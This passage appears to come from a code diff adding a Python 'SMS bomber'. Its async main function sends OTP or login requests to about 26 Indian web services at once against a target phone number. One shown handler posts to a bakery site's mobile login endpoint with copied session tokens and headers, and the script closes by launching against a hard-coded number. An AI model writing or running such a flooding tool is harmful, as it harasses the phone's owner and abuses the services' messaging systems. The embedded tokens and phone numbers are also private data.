+                'Connection': 'keep-alive',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                # 'Cookie': '_gcl_au=1.1.1957854088.1688927598; _gid=GA1.2.1582251896.1688927599; _gat_UA-78924810-1=1; _clck=8sn6gz|2|fd5|0|1285; _fbp=fb.1.1688927600216.1704611332; delpin=110001; XSRF-TOKEN=eyJpdiI6IjZRbzJ0V2s3VEJEUHJTUlZJZGVLMmc9PSIsInZhbHVlIjoiN0p2UDd1N3JBMTVrWkdYdmMyNVZaMDlPV2xqQUtYN2NjRGFrVWJkaTVadUQrWHJCSlpvaUptM3RLTnQzQ0g2byIsIm1hYyI6IjI5ZDhjMzg2MjJmOTc1OTI3NmJmZmRiNzBjOThhODc0YzEwNGQ3MWI4Mjg4NDVkOGUwZjMxMjUzNWJlMzM2YmQifQ%3D%3D; brown_session=eyJpdiI6ImduXC9nMjYyWFBIXC9aVmp0K3JuZDErUT09IiwidmFsdWUiOiJCV09OTEcweXhUXC9CQWlrVHJwZENsb0lnZjFzYjdlcnNhZ1ZRdmxZWmdmU3NCNEJVWFpuRytJMUJJYnNqTjYrQyIsIm1hYyI6IjZmZjRjZTk0YWRmNWI0OTJjZGM3ZDE4YzA4MWIwNzc1YWRlNjgzMjkyMmFiNDVmYWMyMjA3MDUwMjA4MTNiZDYifQ%3D%3D; _ga_VQHFT3DPHH=GS1.1.1688927598.1.1.1688927601.57.0.0; _ga=GA1.2.778904199.1688927599; _ga_JN38K0S1LX=GS1.2.1688927599.1.1.1688927602.57.0.0; _clsk=1nw0vh8|1688927602671|2|1|t.clarity.ms/collect',
+                'Origin': 'https://mrbrownbakery.com',
+                'Referer': 'https://mrbrownbakery.com/',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+                'X-CSRF-TOKEN': 'JTa7wXeLBp7IvdbrFf1PHTgnbHRJ2OEcEMdct6e2',
+                'X-Requested-With': 'XMLHttpRequest',
+                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+            }
+
+            data = {
+                'mobile': '9990212082',
+            }
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://mrbrownbakery.com/customer/loginmobile', cookies=cookies, headers=headers, data=data)as response:
+                    print(response.text)
+            return "done"
+        except Exception as e:
+            return "failed"
+    
+    
+    async def main(tarnum):
+        print("here")
+        
+        for i in range (2):
+            jh = await asyncio.gather(
+                whitehat(tarnum ),    
+                moglix(tarnum ),  
+                medibuddy(tarnum ),   
+                gopaysense(tarnum), 
+                rapido(tarnum), 
+                dunzo(tarnum),   
+                byjus(tarnum ),   
+                ballebazi(tarnum ),   
+                zee5(tarnum),    
+                doubtnut(tarnum),    
+                vedantu(tarnum), 
+                upgrade(tarnum), 
+                physics(tarnum), 
+                confirm(tarnum), 
+                redbus(tarnum) ,  
+                trainman(tarnum),    
+                decathon(tarnum),    
+                lybra(tarnum),   
+                dentalcart(tarnum),  
+                skecher(tarnum), 
+                croma(tarnum),   
+                tendercut(tarnum),   
+                textbook(tarnum),    
+                mg1(tarnum), 
+                apollo247(tarnum),   
+                unacademy(tarnum)
+                )
+            print(jh)
+    asyncio.run(main(tarnum))
+
+indsms(9212548545)
+end = time.time()
+print(end-start)
 
